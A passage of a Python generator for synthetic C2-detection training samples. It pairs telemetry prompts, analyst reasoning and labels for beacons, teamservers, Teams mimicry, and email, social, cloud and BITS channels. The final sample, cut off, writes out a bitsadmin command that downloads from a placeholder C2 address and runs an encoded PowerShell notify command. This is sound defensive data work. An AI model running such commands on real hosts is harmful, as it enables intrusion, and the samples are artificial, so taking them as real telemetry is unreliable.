        f"Polls {p['c2_server']} every {p['poll_interval_s']}s (cv={p['cv']:.4f} = machine-generated). "
        + ("MetaMask extension overridden -- crypto wallet JS hijacked for credential/funds theft. " if p['metamask_override'] else "")
        + f"Startup folder LNK: {p['startup_entry']} (persistence on every login).",
        f"Host {p['host']}: browser is running a C2 extension that can execute "
        "JavaScript in every page context, exfiltrate cookies/passwords, and if MetaMask "
        "is overridden, intercept cryptocurrency transactions.",
        "Browser extension C2 with startup persistence confirmed.",
        "MITRE T1176 (Browser Extensions) + T1547.001 (Startup Folder). "
        "Remove extension directory, remove startup entry, reset browser profile.",
    )
    return prompt, cot, "true_positive"

def _ccx_fp(i):
    p = {"ext": "Cisco Umbrella Roaming Client",
         "id": "jcdhmojfecjfmbdpchihbejnhfjgmkji",
         "source": "Google Admin Console managed deployment"}
    prompt = (f"Windows Host -- Managed Enterprise Chrome Extension.\n"
              f"  extension_name={p['ext']}\n"
              f"  extension_id={p['id']}\n"
              f"  deployment_source={p['source']}\n"
              f"  appears_in_chrome_extensions=YES  web_store_listed=YES")
    cot = _cot(
        "Cisco Umbrella extension deployed via Google Admin Console -- managed, Web Store, known ID.",
        f"Known extension ID. Google Admin managed. Web Store listed. Not hidden.",
        "Authorized enterprise-managed Chrome extension.",
        "Authorized enterprise extension deployment. No action.",
        "T1176 -- AUTHORIZED ENTERPRISE EXTENSION. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 17. TeamserverExposure
#     Evidence: Non-standard port listening on internet-facing host (40056, 6060,
#               6501, 50050), multi-client auth connections, teamserver banner
#               or specific protocol patterns
#     Covers: Havoc 40056, Gunner 6060, Villain 6501, CS 50050
#     Admin FP: Internal admin tool on non-standard port (CMDB registered)
# ═══════════════════════════════════════════════════════════════════════════════

def _tse_tp(i):
    ports     = [(40056, "Havoc-style teamserver"), (6060, "FastAPI/WebSocket teamserver"),
                 (6501, "Python multi-session handler"), (50050, "Cobalt Strike teamserver"),
                 (4444, "Metasploit handler"), (4443, "Reverse HTTPS handler")]
    port, srv = random.choice(ports)
    p = {
        "ip": _ip_ext(), "port": port, "srv_hint": srv,
        "multi_client_auth": random.randint(2, 8),
        "auth_type": random.choice(["username:password", "JWT", "custom binary protocol"]),
        "tls": True, "cert_self_signed": True, "cert_days": random.randint(1, 90),
        "asn": _asn(), "port_class": "teamserver",
    }
    prompt = (f"Network Tap -- C2 Teamserver Port Exposure.\n"
              f"  Listening: {p['ip']}:{p['port']} ({p['srv_hint']})\n"
              f"  multi_operator_connections={p['multi_client_auth']}\n"
              f"  auth_type={p['auth_type']}\n"
              f"  tls={p['tls']}  cert_self_signed={p['cert_self_signed']}\n"
              f"  cert_valid_days={p['cert_days']}\n"
              f"  asn={p['asn']}  port_class={p['port_class']}")
    cot = _cot(
        "Enterprise management ports (RDP 3389, WinRM 5985, HTTPS 443) are on known "
        f"enterprise IP ranges. Port {port} on a commodity VPS ({p['asn']}) with a "
        "self-signed cert and multiple simultaneous operator auth connections has "
        "no authorized admin use case.",
        f"Port {port} ({p['srv_hint']}): well-known C2 teamserver port. "
        f"{p['multi_client_auth']} simultaneous client connections = operators connecting to manage agents. "
        f"cert_self_signed=True, valid_days={p['cert_days']}. "
        f"asn={p['asn']} (commodity VPS = attacker infrastructure). "
        f"auth_type={p['auth_type']} (teamserver operator authentication).",
        f"Active C2 teamserver at {p['ip']}:{port}. "
        f"This is the management endpoint -- killing it disrupts the entire operation. "
        "Hunt for associated beacon IPs that communicate with this teamserver.",
        "C2 teamserver infrastructure confirmed.",
        "MITRE T1583.003 (Acquire Infrastructure: Virtual Private Server). "
        "Block port at perimeter, pivot on teamserver IP for beacon hunting.",
    )
    return prompt, cot, "true_positive"

def _tse_fp(i):
    p = {"port": 8443, "service": "internal-admin-panel",
         "cmdb": "YES", "cert": "corp-pki", "src": "IT admin"}
    prompt = (f"Network Tap -- Non-Standard Port Internal Service.\n"
              f"  port={p['port']}  service={p['service']}\n"
              f"  cmdb_registered={p['cmdb']}  cert_issuer={p['cert']}\n"
              f"  is_internal=YES  single_operator=YES")
    cot = _cot(
        "Internal admin panel on 8443 -- CMDB registered, corp PKI, internal, single operator.",
        f"CMDB registered. Corp PKI cert. Internal host. Single operator.",
        "Authorized internal admin service on non-standard port.",
        "Authorized internal admin panel. No action.",
        "T1583 -- AUTHORIZED INTERNAL SERVICE. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 18. BeaconJitterStatistics
#     Evidence: c2_math features -- interval regularity (low CV), entropy
#               of command sizes, outbound_ratio, packet_size statistics
#               This teaches Model B's c2_math vector space directly
#     Admin FP: CDN keepalive / monitoring heartbeat
# ═══════════════════════════════════════════════════════════════════════════════

def _bjs_tp(i):
    interval  = random.randint(2, 300)
    cv        = round(random.uniform(0.0, 0.12), 4)
    jitter    = random.randint(0, 20)
    p = {
        "src": _ip_int(), "dst": _ip_ext(),
        "outbound_ratio": round(random.uniform(0.3, 0.5), 3),
        "packet_size_mean": random.randint(80, 800),
        "packet_size_std": random.randint(0, 20),
        "interval_s": interval, "cv": cv,
        "entropy": round(random.uniform(3.5, 5.5), 3),
        "payload_entropy": round(random.uniform(3.0, 5.0), 3),
        "score": round(random.uniform(0.75, 0.99), 3),
        "jitter_pct": jitter,
        "sessions": random.randint(50, 2000),
    }
    prompt = (f"C2 Math Vector Analysis -- Beacon Pattern Classification.\n"
              f"Source: {p['src']} → {p['dst']}\n"
              f"  sessions_analyzed={p['sessions']}\n"
              f"  outbound_ratio={p['outbound_ratio']:.3f}\n"
              f"  packet_size_mean={p['packet_size_mean']}B  packet_size_std={p['packet_size_std']}B\n"
              f"  interval_s={p['interval_s']}  variance_inter_arrival={p['cv']:.4f}\n"
              f"  payload_entropy={p['entropy']:.3f}  payload_entropy={p['payload_entropy']:.3f}\n"
              f"  anomaly_score={p['score']:.3f}")
    cot = _cot(
        f"CDN keepalives and monitoring heartbeats have higher CV (human scheduling jitter, "
        f"NTP drift) and lower entropy (fixed health-check payloads with predictable content).",
        f"cv={p['cv']:.4f}: near-zero CV indicates machine-generated timing (human sessions "
        "have cv > 0.3). "
        f"packet_size_std={p['packet_size_std']}B (very low variance = fixed-size protocol frames). "
        f"entropy={p['entropy']:.3f} (high = encrypted/compressed payload). "
        f"payload_entropy={p['payload_entropy']:.3f} (command structure has cryptographic randomness). "
        f"outbound_ratio={p['outbound_ratio']:.3f} (near 0.5 = symmetric check-in/response). "
        f"anomaly_score={p['score']:.3f} (Model A baseline detected this as anomalous).",
        f"Host {p['src']}: c2_math vector pattern matches known C2 beacon characteristics. "
        "Machine-precise timing + encrypted payload + symmetric ratio = automated beacon loop.",
        "C2 beacon confirmed via statistical analysis of c2_math feature vector.",
        "MITRE T1071.001 (Web Protocols via beacon). Isolate source, block destination.",
    )
    return prompt, cot, "true_positive"

def _bjs_fp(i):
    p = {"cv": round(random.uniform(0.2, 0.5), 3),
         "entropy": round(random.uniform(1.0, 2.5), 3),
         "app": "Datadog agent", "interval": 60}
    prompt = (f"C2 Math Vector Analysis -- Monitoring Agent Heartbeat.\n"
              f"  interval_s={p['interval']}  variance_inter_arrival={p['cv']:.3f}\n"
              f"  payload_entropy={p['entropy']:.3f}\n"
              f"  destination=intake.datadoghq.com  app={p['app']}")
    cot = _cot(
        f"Datadog agent: cv={p['cv']:.3f} (above 0.2 = not machine precision), "
        f"entropy={p['entropy']:.3f} (predictable metric format, not encrypted payload).",
        f"cv={p['cv']:.3f} (higher than C2 threshold). entropy={p['entropy']:.3f} (low = structured metrics).",
        "Authorized monitoring agent heartbeat -- higher CV, lower entropy.",
        "Authorized monitoring agent. No action.",
        "T1071.001 -- AUTHORIZED APM HEARTBEAT. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 19. StackCallSpoofing
#     Evidence: Process call stack shows RET to non-code region or DLL without
#               a corresponding CALL instruction, thread context manipulation,
#               abnormal stack depth
#     Covers: Koneko (return address spoofing on every API call),
#             Havoc (context spoofing), rekkoex
#     Admin FP: Fiber-switched code (SQL Server, game engines -- documented)
# ═══════════════════════════════════════════════════════════════════════════════

def _scs_tp(i):
    p = {
        "host": _host(), "process": random.choice(["notepad.exe","werfault.exe","svchost.exe"]),
        "spoofed_return_addr": f"ntdll.dll+0x{random.randint(1000,9999):04x}",
        "actual_function": random.choice(["NtCreateThreadEx","VirtualAllocEx","NtWriteVirtualMemory"]),
        "stack_frames_spoofed": random.randint(3, 10),
        "rop_gadget": i % 2 == 0,
        "rtl_capture_context": True,
    }
    prompt = (f"Windows Host (EDR Stack Trace) -- Return Address Spoofing.\n"
              f"Host: {p['host']}  Process: {p['process']}\n"
              f"  API_called: {p['actual_function']}\n"
              f"  return_address_on_stack: {p['spoofed_return_addr']} (should be in caller module)\n"
              f"  expected_caller: ntdll.dll or legitimate_module\n"
              f"  stack_frames_spoofed={p['stack_frames_spoofed']}\n"
              + (f"  ROP_gadget_used_for_RET=YES\n" if p['rop_gadget'] else "")
              + f"  RtlCaptureContext_called=YES (thread context manipulation)")
    cot = _cot(
        "SQL Server uses fibers (not threads) which can have unusual stacks, and some game engines "
        "use custom schedulers. However, these are signed, documented, and the stack anomaly is "
        "consistent across fiber yields. Spoofed return addresses that change per API call are not fibers.",
        f"Return address on stack for {p['actual_function']} points to {p['spoofed_return_addr']} "
        "but no CALL instruction at that address precedes the frame -- the return address is forged. "
        f"{p['stack_frames_spoofed']} frames spoofed: attacker replacing the entire call chain. "
        + (f"ROP gadget: attacker used RET-to-gadget for indirect execution without a traceable call chain. " if p['rop_gadget'] else "")
        + "RtlCaptureContext: thread context captured and modified to insert fake frames.",
        f"Process {p['process']} on {p['host']}: EDR stack-based detections are blinded. "
        "The call chain visible in EDR telemetry is fake -- actual malicious code location is hidden.",
        "Stack return address spoofing confirmed -- EDR call chain evasion.",
        "MITRE T1055 + T1562.001 (Memory Manipulation + Impair Defenses). "
        "Kernel-level memory forensics required -- user-space EDR stack traces compromised.",
    )
    return prompt, cot, "true_positive"

def _scs_fp(i):
    p = {"proc": "sqlservr.exe", "reason": "SQL Server Fiber scheduler",
         "documented": "YES", "signed": True}
    prompt = (f"Windows Host -- Fiber-Switched Stack Anomaly.\n"
              f"  Process: {p['proc']}\n"
              f"  reason={p['reason']}  documented={p['documented']}\n"
              f"  signed={p['signed']}  stack_consistent_across_yields=YES")
    cot = _cot(
        "SQL Server fiber scheduler -- documented behavior, consistent across yields, signed by Microsoft.",
        "Documented SQL Server fiber pattern. Consistent. Signed by Microsoft.",
        "Authorized SQL Server fiber scheduler -- documented, consistent, signed.",
        "Authorized SQL Server fiber switching. No action.",
        "T1055 -- AUTHORIZED SQL SERVER FIBERS. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 20. HavocTeamsMimicry
#     Evidence: x-ms-session-id GUID header, x-ms-client-type: desktop,
#               x-ms-environment: prod, but destination is not Microsoft AS,
#               POST to /Collector/2.0/settings/ on non-Microsoft IP
#     Covers: Havoc Teams profile specifically (most used Havoc profile)
#     Admin FP: Actual Microsoft Teams traffic
# ═══════════════════════════════════════════════════════════════════════════════

def _htm_tp(i):
    session_id = str(random.randint(10**15, 10**16))
    version    = f"1.{random.randint(3,7)}.{random.randint(0,9)}.{random.randint(1000,9999)}"
    p = {
        "src": _ip_int(), "dst": _ip_ext(), "port": 443,
        "uri": "/Collector/2.0/settings/",
        "x_ms_session_id": session_id,
        "x_ms_client_type": "desktop",
        "x_ms_environment": "prod",
        "x_ms_client_version": version,
        "ua": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Teams/{version}",
        "referer": "https://teams.microsoft.com/_",
        "accept": "application/json, text/plain, */*",
        "dst_asn": _asn(),
        "dst_is_microsoft": False,
        "cert_self_signed": True,
        "interval_s": random.randint(2, 10),
        "cv": round(random.uniform(0.01, 0.08), 4),
    }
    prompt = (f"Network Tap -- Havoc Teams Profile Beacon.\n"
              f"Source: {p['src']} → {p['dst']}:{p['port']}\n"
              f"  http_method=POST  uri={p['uri']}\n"
              f"  x-ms-session-id: {p['x_ms_session_id']}\n"
              f"  x-ms-client-type: {p['x_ms_client_type']}\n"
              f"  x-ms-environment: {p['x_ms_environment']}\n"
              f"  x-ms-client-version: {p['x_ms_client_version']}\n"
              f"  User-Agent: {p['ua']}\n"
              f"  Referer: {p['referer']}\n"
              f"  dst_asn: {p['dst_asn']}\n"
              f"  dst_is_microsoft_as: {p['dst_is_microsoft']}\n"
              f"  cert_self_signed: {p['cert_self_signed']}\n"
              f"  interval_s={p['interval_s']}  cv={p['cv']:.4f}")
    cot = _cot(
        "The Microsoft Teams client sends /Collector/2.0/settings/ requests, but exclusively "
        "to Microsoft-operated infrastructure (AS8075 Microsoft Corporation). The x-ms-* headers "
        "and Teams User-Agent are correct format -- but the destination AS is definitively wrong.",
        f"URI=/Collector/2.0/settings/ + x-ms-* headers = Havoc Teams malleable profile. "
        f"dst_asn={p['dst_asn']} (NOT AS8075 Microsoft -- this traffic is NOT going to Microsoft). "
        f"cert_self_signed=True (Teams uses Microsoft IT TLS CA -- never self-signed). "
        f"cv={p['cv']:.4f} (machine precision -- Teams client has human-driven irregular intervals). "
        f"interval_s={p['interval_s']} (consistent machine loop -- not user-driven Teams activity). "
        "Header combination is a documented Havoc Teams C2 profile pattern.",
        f"Host {p['src']}: C2 beacon using Havoc Teams profile to blend into Microsoft Teams "
        "traffic. DPI and URI-based detection will classify this as legitimate Teams. "
        "Destination IP correlation with Microsoft AS is the primary discriminator.",
        "Havoc Teams profile C2 beacon confirmed -- header/URI mimicry with wrong destination AS.",
        "MITRE T1001.003 (Protocol Impersonation) + T1071.001. "
        "Block destination IP, alert on Teams-pattern traffic to non-Microsoft AS.",
    )
    return prompt, cot, "true_positive"

def _htm_fp(i):
    p = {"dst": "teams.microsoft.com", "asn": "AS8075 Microsoft Corporation",
         "cert": "Microsoft IT TLS CA 5", "interval": "irregular (user-driven)"}
    prompt = (f"Network Tap -- Microsoft Teams Client Traffic.\n"
              f"  dst={p['dst']}:443  asn={p['asn']}\n"
              f"  cert_issuer={p['cert']}\n"
              f"  interval={p['interval']}  user_session_active=YES")
    cot = _cot(
        "Actual Teams traffic to Microsoft AS with Microsoft PKI cert and user-driven irregular timing.",
        f"dst=teams.microsoft.com. asn={p['asn']}. cert={p['cert']} (Microsoft PKI). User-driven.",
        "Authorized Microsoft Teams client traffic.",
        "Authorized Teams traffic. No action.",
        "T1071.001 -- AUTHORIZED TEAMS CLIENT. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# SocialPlatformC2 (from Framework-Botnet/ Telegram/Discord/Slack C2 modules)
#   Evidence: machine-generated POST rate to platform bot/webhook API endpoints,
#             base64/encrypted command payload in message body, low beacon CV,
#             response contains encoded commands parsed by implant
#   Admin FP: Legitimate DevOps pipeline sending build-status notifications
#             (known bot token, pipeline source IP, bounded irregular rate)
# ═══════════════════════════════════════════════════════════════════════════════

def _spc_tp(i):
    platforms = [
        ("api.telegram.org",     f"/bot{random.randint(10**9,10**10-1)}:{random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789',k=35)}/sendMessage",
         "Telegram Bot API", "T1102.002"),
        ("discord.com",          f"/api/webhooks/{random.randint(10**17,10**18-1)}/{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_',k=68))}",
         "Discord Webhook", "T1102.002"),
        ("slack.com",            f"/api/chat.postMessage",
         "Slack API", "T1102"),
    ]
    host_name, uri, platform_name, technique = platforms[i % len(platforms)]
    interval_s = random.randint(15, 120)
    cv         = round(random.uniform(0.01, 0.10), 4)
    sessions   = random.randint(20, 200)
    payload_b  = random.randint(100, 800)
    b64_snippet = "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", k=40))
    src        = _ip_int() if i % 3 != 0 else _ip_ext()
    host       = _host()

    prompt = (f"Network Tap -- Social Platform C2 Channel.\n"
              f"Source: {src} ({host}) → {host_name}\n"
              f"  http_method=POST  http_uri={uri[:60]}...\n"
              f"  sessions={sessions}  interval_s={interval_s}  variance_inter_arrival={cv:.4f}\n"
              f"  payload_bytes_avg={payload_b}  payload_base64_encoded=YES\n"
              f"  sample_message_content='{{\"text\":\"{b64_snippet}==\"}}'\n"
              f"  direction=bidirectional  response_parsed_for_commands=YES\n"
              f"  platform={platform_name}  port_class=social_api")

    cot = _cot(
        f"Legitimate {platform_name} usage (DevOps notifications, alert bots) sends messages "
        f"irregularly in response to events -- it does not POST at a machine-generated {interval_s}s "
        "interval with near-zero CV. Human-driven bots also do not base64-encode command payloads "
        "and parse responses as command instructions.",
        f"variance_inter_arrival={cv:.4f} (machine-generated heartbeat, not event-driven). "
        f"{sessions} sessions to {platform_name} API at {interval_s}s intervals. "
        f"Base64-encoded message content (encoding commands, not human-readable text). "
        f"Response parsed for commands = bidirectional C2 channel, not one-way notification.",
        f"Host {host} ({src}) is using {platform_name} as a C2 channel. "
        "Traffic blends with legitimate platform API usage and bypasses domain-based blocklists.",
        f"Social platform C2 confirmed via {platform_name} -- machine-paced beacon + encoded commands.",
        f"MITRE {technique} (Web Service C2). Block {host_name} at proxy for non-business-justified "
        "sources, isolate host, dump implant process memory.",
    )
    return prompt, cot, "true_positive"

def _spc_fp(i):
    platform = random.choice(["Telegram","Discord","Slack"])
    prompt = (f"Network Tap -- DevOps Pipeline Notification.\n"
              f"  source_ip=github-actions-runner  pipeline=build-notify-bot\n"
              f"  platform={platform}  http_method=POST\n"
              f"  sessions_per_hour={random.randint(1,8)}  (event-driven, not timed)\n"
              f"  message_content=plain_text  base64_encoded=NO  response_parsed=NO\n"
              f"  bot_token=registered_in_corp_secrets  source_group=CI_CD_Infrastructure\n"
              f"  ticket=DEV-{random.randint(1000,9999)}")
    cot = _cot(
        f"DevOps pipeline notification bot: event-driven (not timed), plain text message, "
        "no response parsing, registered bot token, known CI/CD source IP.",
        f"irregular rate (event-driven). message_content=plain_text. response_parsed=NO. "
        f"Bot token registered in corp secrets. Source=CI/CD runner. Ticket.",
        f"Authorized DevOps notification -- event-driven, plain text, known CI/CD source.",
        f"DevOps pipeline {platform} notification -- event-driven, no command encoding.",
        "T1102 -- AUTHORIZED DEVOPS NOTIFICATION. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# EmailIMAPCommandC2 (from pwsh-scripts/Send-CommandToAgent.ps1 + botnet email module)
#   Evidence: periodic IMAP SEARCH for specific subject patterns + FETCH of matched
#             messages at machine-generated interval, SMTP reply channel for command
#             results -- bidirectional over legitimate mail infrastructure
#   Admin FP: Legitimate email client IDLE/polling (irregular, multi-folder, MUA UA)
# ═══════════════════════════════════════════════════════════════════════════════

def _eic_tp(i):
    interval_s = random.randint(30, 300)
    cv         = round(random.uniform(0.01, 0.09), 4)
    sessions   = random.randint(15, 100)
    subject_kw = random.choice(["TASK:","CMD:","EXEC:",">>","[agent]","[cmd]"])
    mail_host  = random.choice(["mail.gmail.com","imap.outlook.com","mail.proton.me",
                                 "imap.mail.yahoo.com","imap.yandex.com"])
    result_smtp = random.choice(["smtp.gmail.com","smtp.outlook.com","smtp.proton.me"])
    src        = _ip_int() if i % 3 != 0 else _ip_ext()
    host       = _host()

    prompt = (f"Network Tap -- Email IMAP/SMTP C2 Channel.\n"
              f"Source: {src} ({host})\n"
              f"  phase_1_imap: dst={mail_host}:993  sessions={sessions}\n"
              f"    interval_s={interval_s}  variance_inter_arrival={cv:.4f}\n"
              f"    imap_commands=SEARCH+FETCH  search_subject_filter='{subject_kw}*'\n"
              f"    folders_accessed=INBOX_ONLY  (no Drafts/Sent -- not human browsing)\n"
              f"  phase_2_smtp: dst={result_smtp}:587\n"
              f"    smtp_send_after_imap_fetch=YES  (command result reply)\n"
              f"    from_addr=agent_{random.randint(1000,9999)}@gmail.com\n"
              f"  bidirectional_command_channel=YES\n"
              f"  email_client_user_agent=NO  (no MUA headers -- raw IMAP protocol)")

    cot = _cot(
        f"Legitimate email clients (Outlook, Thunderbird) connect interactively with irregular timing, "
        f"use IMAP IDLE or full folder sync, carry MUA user-agent headers, and do not immediately "
        f"send SMTP replies after fetching messages. The SEARCH filter '{subject_kw}*' is a command-"
        "polling pattern -- human users browse folders, not search for prefixed subjects.",
        f"variance_inter_arrival={cv:.4f} (machine-generated polling, not human). "
        f"SEARCH filter '{subject_kw}*' = command prefix polling. "
        f"INBOX_ONLY access (not a mail client -- clients sync multiple folders). "
        f"No MUA user-agent = raw IMAP library (not Outlook/Thunderbird). "
        f"SMTP send immediately after FETCH = command result reply channel.",
        f"Host {host} ({src}) has a bidirectional C2 channel over legitimate email infrastructure. "
        "Traffic is encrypted TLS and indistinguishable from normal email at the network perimeter.",
        "Email IMAP/SMTP C2 channel confirmed -- machine-paced polling + command-subject filter.",
        "MITRE T1071.003 + T1102 (Email C2 + Web Service). "
        "Block outbound IMAP/SMTP for non-mail-server hosts via DLP policy, isolate host.",
    )
    return prompt, cot, "true_positive"

def _eic_fp(i):
    client = random.choice(["Outlook","Thunderbird","Apple Mail"])
    prompt = (f"Network Tap -- Email Client Activity.\n"
              f"  client={client}  user_agent='{client}/16.0 IMAP4'\n"
              f"  imap_pattern=IDLE+FETCH  folders_accessed=INBOX,Sent,Drafts,Calendar\n"
              f"  interval=irregular  (IMAP IDLE, event-driven)\n"
              f"  search_filter=NONE  smtp_after_fetch=NO\n"
              f"  interactive_user=YES")
    cot = _cot(
        f"Legitimate {client} usage: IMAP IDLE (event-driven, not timed), multiple folders, "
        "MUA user-agent, no SEARCH filter, no automatic SMTP reply after fetch.",
        f"IMAP IDLE (not periodic SEARCH). Multiple folders. MUA user-agent. "
        "No subject filter. No SMTP after fetch. Interactive user.",
        f"Authorized {client} email activity -- IMAP IDLE, interactive user, no command pattern.",
        f"{client} IMAP IDLE -- event-driven, no command filter, multi-folder, MUA UA.",
        "T1071.003 -- AUTHORIZED EMAIL CLIENT. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ── Extension: 4 additional C2 channel classes ───────────────────────────────

def _icmp_tp(i):
    c2_ip = f"45.33.{random.randint(1,254)}.{random.randint(1,254)}"
    host = _host()
    payload_size = random.randint(128, 1472)
    cv = round(random.uniform(0.01, 0.08), 4)
    variants = [
        "ICMP echo data field carries encrypted shellcode commands",
        "ICMP sequence numbers encode C2 command index (LSB steganography)",
    ]
    desc = variants[i % len(variants)]
    prompt = (f"Network Tap Telemetry -- ICMP Covert Channel C2.\n"
              f"Host: {host}  (implant)\n"
              f"  protocol=ICMP  type=echo-request  destination={c2_ip}\n"
              f"  payload_size={payload_size}_bytes  (>64 bytes -- non-standard ICMP payload)\n"
              f"  variance_inter_arrival={cv:.4f}  (machine-generated -- CV < 0.08 = beacon)\n"
              f"  session_count={random.randint(20,200)}  (persistent over time)\n"
              f"  icmp_data_entropy=7.{random.randint(1,9)}  (high entropy -- encrypted content)\n"
              f"  technique: {desc}")
    cot = _cot(
        "ICMP echo (ping) is used for network diagnostics. Legitimate ICMP: "
        "8-32 byte payloads, human-timed, non-repeating to fixed external IPs.",
        f"ICMP payload {payload_size} bytes (standard is 32-56) + CV={cv:.4f} "
        "(machine-generated beacon) + high entropy data = covert channel. "
        f"{desc}. ICMP is often allowed through firewalls that block other protocols.",
        f"Host {host}: ICMP covert channel C2 to {c2_ip}. {desc}.",
        "ICMP covert channel confirmed -- oversized high-entropy beacon.",
        "MITRE T1095. Block ICMP to external IPs exceeding 128 bytes. Isolate host.",
    )
    return prompt, cot, "true_positive"

def _icmp_fp(i):
    prompt = (f"Network Tap Telemetry -- IT Diagnostic Ping.\n"
              f"  protocol=ICMP  type=echo-request\n"
              f"  payload_size=32_bytes  (standard)\n"
              f"  variance_inter_arrival=0.89  (human-timed -- high variance)\n"
              f"  session_count=4  (short burst)\n"
              f"  source=ops_workstation  context=network_troubleshooting")
    cot = _cot(
        "Standard diagnostic ping -- 32 bytes, human-timed, short burst.",
        "Standard size. High CV (human). Short session. Diagnostic context.",
        "Authorized ping -- standard ICMP, human timing, diagnostic.",
        "Standard ping -- 32 bytes, high CV, short session.",
        "T1095 -- AUTHORIZED DIAGNOSTIC PING. No action.", action="dismiss",
    )
    return prompt, cot, "false_positive"


def _csc2_tp(i):
    host = _host()
    platforms = [
        ("s3.amazonaws.com", "AWS S3 bucket", "PutObject commands, GetObject results"),
        ("blob.core.windows.net", "Azure Blob", "blob upload C2 commands, download results"),
        ("storage.googleapis.com", "GCS bucket", "GCS JSON API polling for commands"),
    ]
    domain, platform, desc = platforms[i % len(platforms)]
    cv = round(random.uniform(0.01, 0.09), 4)
    ua = random.choice(["python-requests/2.28.0","Go-http-client/1.1","curl/7.88.1"])
    prompt = (f"Network Tap Telemetry -- Cloud Storage C2 Channel.\n"
              f"  source_host: {host}  destination: {domain}\n"
              f"  http_method=GET+PUT  http_useragent={ua}\n"
              f"    (NOT a cloud SDK -- generic HTTP UA)\n"
              f"  variance_inter_arrival={cv:.4f}  (machine beacon)\n"
              f"  session_count={random.randint(10,50)}  poll_interval_s={random.randint(10,60)}\n"
              f"  technique: {platform} as dead drop -- {desc}")
    cot = _cot(
        f"Legitimate {platform} access: known cloud SDK UA (boto3, azure-storage-blob), "
        "authorized service account, access logs showing business-purpose keys.",
        f"Generic HTTP UA '{ua}' (not a cloud SDK) to {domain} with beacon timing "
        f"CV={cv:.4f} = implant polling cloud storage for commands. {desc}. "
        "Cloud storage C2 evades network controls that allow S3/Azure/GCS.",
        f"Host {host}: {platform} used as C2 dead drop -- beacon polling with generic UA.",
        f"Cloud storage C2 confirmed -- {platform}, generic UA, beacon timing.",
        "MITRE T1102.002. Block cloud storage from non-authorized processes. Investigate bucket.",
    )
    return prompt, cot, "true_positive"

def _csc2_fp(i):
    prompt = (f"Network Tap Telemetry -- Authorized Cloud Backup.\n"
              f"  destination: s3.amazonaws.com\n"
              f"  http_useragent: aws-sdk-java/2.20.0 (authorized backup client)\n"
              f"  variance_inter_arrival=0.72  (human/job-triggered -- high variance)\n"
              f"  source_process=BackupAgent.exe  signed=YES\n"
              f"  aws_role=svc-backup-role  cmdb_registered=YES")
    cot = _cot(
        "Authorized backup to S3 -- AWS SDK, signed backup agent, service role, CMDB.",
        "AWS SDK UA. High CV (job-triggered). Signed backup process. Service role.",
        "Authorized S3 backup -- SDK UA, signed process, service role.",
        "S3 backup -- AWS SDK, signed, service role, CMDB.",
        "T1102.002 -- AUTHORIZED CLOUD BACKUP. No action.", action="dismiss",
    )
    return prompt, cot, "false_positive"


def _ghc2_tp(i):
    host = _host()
    cv = round(random.uniform(0.02, 0.09), 4)
    ua = random.choice(["python-requests/2.28","Go-http-client/2.0","curl/7.88"])
    prompt = (f"Network Tap Telemetry -- GitHub Gist Dead-Drop C2.\n"
              f"  source_host: {host}  destination: api.github.com\n"
              f"  http_uri: /gists/{''.join(random.choices('abcdef0123456789',k=32))}  (fixed Gist ID)\n"
              f"  http_method=GET  http_useragent={ua}\n"
              f"    (not git/gh CLI -- generic UA)\n"
              f"  variance_inter_arrival={cv:.4f}  (machine beacon)\n"
              f"  session_count={random.randint(15,60)}  over_8h=YES\n"
              f"  authorization: Bearer ghp_{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789',k=20))}\n"
              f"    (PAT token hardcoded in implant -- not user's own token)")
    cot = _cot(
        "Legitimate GitHub API access: from developer tools (git, gh CLI, IDE extensions) "
        "with user's own tokens, human-timed, varied URIs.",
        f"Generic UA (not git/gh CLI), fixed Gist ID polled repeatedly with beacon timing "
        f"CV={cv:.4f} = dead-drop resolver pattern. Hardcoded PAT not matching user. "
        "GitHub API traffic is rarely blocked, making it effective for C2.",
        f"Host {host}: GitHub Gist used as C2 dead drop -- fixed Gist polled as beacon.",
        "GitHub Gist C2 confirmed -- fixed Gist ID, generic UA, beacon timing.",
        "MITRE T1102.001. Block Gist API from non-dev processes. Revoke PAT token.",
    )
    return prompt, cot, "true_positive"

def _ghc2_fp(i):
    prompt = (f"Network Tap Telemetry -- Developer GitHub API Access.\n"
              f"  destination: api.github.com\n"
              f"  http_useragent: GitHub CLI 2.40.0 (authorized dev tool)\n"
              f"  variance_inter_arrival=0.88  (human-timed -- high variance)\n"
              f"  source_process=gh.exe  signed=YES  user_group=Engineering")
    cot = _cot(
        "Developer using gh CLI -- correct UA, human timing, signed tool, Engineering group.",
        "gh CLI UA. High CV (human). Signed. Engineering group.",
        "Authorized dev GitHub access -- gh CLI, human timing, Engineering.",
        "GitHub access -- gh CLI, human timing, Engineering.",
        "T1102.001 -- AUTHORIZED DEV GITHUB ACCESS. No action.", action="dismiss",
    )
    return prompt, cot, "false_positive"


def _btc2_tp(i):
    host = _host(); user = _host()
    c2_ip   = f"185.220.{random.randint(1,254)}.{random.randint(1,254)}"
    job_name = f"{''.join(random.choices('abcdef',k=8))}Update"
    notif_cmd = random.choice([
        f"C:\\Users\\Public\\{''.join(random.choices('abcdef',k=6))}.exe",
        f"powershell -enc {_b64(40)}",
    ])
    prompt = (f"Windows Host Telemetry -- BITS Transfer Job as C2 Persistence.\n"
              f"  EventID=1  Image: bitsadmin.exe  ParentImage: powershell.exe\n"
              f"    CommandLine: bitsadmin /create {job_name} && "
              f"bitsadmin /addfile {job_name} http://{c2_ip}/cmd %TEMP%\\cmd.dat && "
              f"bitsadmin /SetNotifyCmdLine {job_name} {notif_cmd} && "
